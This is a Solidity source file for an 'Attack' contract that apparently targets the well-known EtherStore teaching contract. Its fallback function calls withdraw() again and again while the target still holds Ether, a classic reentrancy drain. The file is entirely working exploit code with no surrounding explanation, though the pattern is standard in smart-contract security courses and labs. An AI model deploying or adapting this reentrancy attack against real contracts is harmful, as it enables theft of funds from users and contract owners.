// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./EtherStore.sol";



contract Attack {
    EtherStore public etherStore;

    event FallBackEvent(string indexed );
    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1);
        etherStore.deposit{value: 1}();
        etherStore.withdraw();
    }

    function set() external payable {
        require(msg.value >= 1);
        etherStore.deposit{value: msg.value}();
    }


    function get() external payable {
        etherStore.withdraw();
    }

    function getETHESTOREBalance() public view returns (uint){
       return  address(etherStore).balance;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        // if (address(etherStore).balance >= 1) {
        //     etherStore.withdraw();
        // }
    }
}